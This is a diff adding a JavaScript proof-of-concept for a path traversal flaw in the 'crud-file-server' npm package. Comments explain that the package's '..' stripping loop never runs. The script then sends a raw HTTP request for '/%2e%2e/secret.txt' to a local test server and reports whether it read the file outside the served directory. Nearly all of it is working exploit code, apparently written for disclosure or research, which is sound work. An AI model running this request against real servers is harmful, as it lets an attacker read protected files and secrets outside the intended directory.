@@ -1,0 +1,40 @@
+```javascript
+const http = require("http");
+const net = require("net");
+const server_lib = require("crud-file-server");
+
+// Serve only the "public" directory, read-only.
+const server = http.createServer((req, res) => {
+  server_lib.handleRequest(null, __dirname + "/public", req, res, true, false);
+});
+
+server.listen(0, () => {
+  const port = server.address().port;
+
+  // crud-file-server's cleanUrl() tries to strip ".." with:
+  //   while (url.indexOf('..').length > 0) { ... }
+  // indexOf() returns a Number, which has no .length, so the condition
+  // is always `undefined > 0` === false. The loop body NEVER runs, so
+  // ".." is never stripped and the traversal check is a complete no-op.
+  //
+  // A raw socket is used (instead of http.get) so the "%2e%2e" sequence
+  // reaches the server unmodified, bypassing client-side URL normalization.
+  const sock = net.connect(port, "127.0.0.1", () => {
+    sock.write(
+      "GET /%2e%2e/secret.txt HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
+    );
+  });
+
+  let data = "";
+  sock.on("data", (c) => (data += c));
+  sock.on("end", () => {
+    console.log("Raw HTTP response:\n" + data);
+    console.log(
+      data.includes("TOP SECRET DATA")
+        ? "\n[+] Path traversal succeeded: read file outside served directory!"
+        : "\n[-] Traversal failed"
+    );
+    server.close();
+  });
+});
+```
